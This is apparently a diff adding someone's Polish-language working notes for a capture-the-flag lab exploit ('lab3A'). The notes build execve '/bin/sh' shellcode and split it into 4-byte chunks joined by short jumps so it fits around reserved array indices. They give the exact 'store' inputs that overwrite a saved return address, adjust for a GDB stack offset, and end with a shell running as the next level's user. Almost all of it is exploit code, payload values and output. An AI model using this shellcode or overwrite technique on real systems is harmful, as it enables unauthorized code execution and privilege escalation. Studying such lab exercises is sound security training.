@@ -1,0 +1,234 @@
+store
+77777
+1
+
+Ma to adres: 0xbffff54c
+---------
+store
+8888
+2
+---------
+store
+3221222732 -> czyli adres 0xbffff54c
+109 -> czyli:
+	hex(0xbffff6fc-0xbffff548)
+	'0x1b4'
+	>>> 0x1b4
+	436
+	>>> 0x1b4/4
+	109 
+
+bo ret:
+ 0x8048c3b <main+553>:	ret
+.....
+0000| 0xbffff6fc --> i tu dajemy nasza wartosc pod 1 store 0xbffff54c --> 0x1e61
+
+st
+
+
+=> 0x8048c3b <main+553>:	ret
+
+
+
+xor    %eax,%eax
+push   %eax
+push   $0x68732f2f
+push   $0x6e69622f
+mov    %esp,%ebx
+push   %eax
+push   %ebx
+mov    %esp,%ecx
+mov    $0xb,%al
+int    $0x80
+
+---
+Shellcode:
+
+xor eax, eax
+push eax
+push 0x68732f2f
+push 0x6e69622f
+mov ebx, esp
+mov ecx, eax
+mov edx, eax
+mov al, 0xb
+int 0x80
+
+
+------------------
+root@kali:~/lab3a# objdump -d ./test -Mintel
+
+./test:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048060 <__bss_start-0x1017>:
+ 8048060:	31 c0                	xor    eax,eax.   | ok 0x6850c031
+ 8048062:	50                   	push   eax        | ok 0x04eb2f2f
+ 8048063:	68 2f 2f 73 68       	push   0x68732f2f
+ 8048068:	68 2f 62 69 6e       	push   0x6e 69 62 2f
+ 804806d:	89 e3                	mov    ebx,esp
+ 804806f:	89 c1                	mov    ecx,eax
+ 8048071:	89 c2                	mov    edx,eax
+ 8048073:	b0 0b                	mov    al,0xb
+ 8048075:	cd 80                	int    0x80
+
+
+ Potrzeba 23 bajty + jmpy
+
+Indexy:
+0 -> reserved (4 bajty -> unsigned int)
+1 -> ok 0xbffff51c (4 bajty)
+2 -> ok 0xbffff54c 	
+3 -> reserved
+4 -> ok 0xbffff550
+5 -> ok 0xbffff558
+6 -> reserved
+7 -> ok 0xbffff55c
+8 -> ok 0xbffff564
+
+eb 04 -> jmp +0x4
+
+31 c0 50 68 0x6850c031
+2f 2f eb 04 0x04eb2f2f
+
+73 68 68 90 0x90686873
+2f 62 eb 04 0x04eb622f
+
+69 6e 89 e3 0xe3896e69
+89 c1 eb 04 0x04ebc189
+
+
+89 c2 b0 0b 0x0bb0c289
+cd 80 90 90 0x909080cd
+
+
+
+
+ 8048060:	31 c0                	xor    eax,eax.   
+ 8048062:	50                   	push   eax   
+0x9050c031
+0x04eb9090
+
+
+ 8048063:	68 2f 2f 73 68       	push   0x68732f2f
+0x68732f2f
+0x04eb9068
+
+ 8048068:	68 2f 62 69 6e       	push   0x6e 69 62 2f
+0x6e69622f
+0x04eb9068
+
+ 804806d:	89 e3                	mov    ebx,esp
+ 804806f:	89 c1                	mov    ecx,eax
+0xc189e389
+ 8048071:	89 c2                	mov    edx,eax
+0x04ebc289
+
+
+0x80cd0bb0
+ 8048073:	b0 0b                	mov    al,0xb
+ 8048075:	cd 80                	int    0x80
+
+31 c0 50 90 | 90 90 eb 04
+68 2f 2f 73 | 68 90 eb 04
+68 2f 62 69 | 6e 90 eb 04
+89 e3 89 c1 | 89 c2 eb 04
+b0 0b cd 80 |
+
+
+0x9050c031 2421211185
+0x04eb9090 82546832
+0x732f2f68 1932472168
+0x04eb9068 82546792
+0x69622f68 1768042344
+0x04eb906e 82546798
+0xc189e389 3247039369
+0x04ebc289 82559625
+0x80cd0bb0 2160921520
+
+
+store
+2421211185
+1
+store
+82546832
+2
+store
+1932472168
+4
+store
+82546792
+5
+store
+1768042344
+7
+store
+82546798
+8
+store
+3247039369
+10
+store
+82559625
+11
+store
+2160921520
+13
+store
+3221222732
+109
+quit
+
+Trzeba odjąć jeszcze 0x40, bo sie rozni GDB stack!
+
+hex(3221222732-0x40)
+'0xbffff50c'
+>>> 0xbffff50c
+3221222668
+
+Input command: store
+2421211185
+1
+store
+82546832
+2
+store
+1932472168
+4
+store
+82546792
+5
+store
+1768042344
+7
+store
+82546798
+8
+store
+3247039369
+10
+store
+82559625
+11
+store
+2160921520
+13
+store
+3221222668
+109
+quit Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:
+$ id
+uid=1012(lab3A) gid=1013(lab3A) euid=1013(lab3end) groups=1014(lab3end),1001(gameuser),1013(lab3A)
+
